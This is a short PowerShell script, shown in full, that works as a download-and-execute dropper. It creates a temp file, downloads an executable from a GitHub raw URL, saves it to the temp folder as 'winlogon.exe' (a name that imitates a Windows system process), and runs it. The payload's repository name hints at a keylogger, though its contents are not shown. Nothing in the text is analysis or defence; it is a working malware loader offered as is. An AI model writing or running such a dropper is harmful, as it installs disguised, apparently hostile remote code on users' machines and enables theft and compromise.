New-Item "$env:temp\A58F.tmp"
(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/kl/main/main.exe", "$env:temp\winlogon.exe")
cmd.exe /c "$env:temp\winlogon.exe"
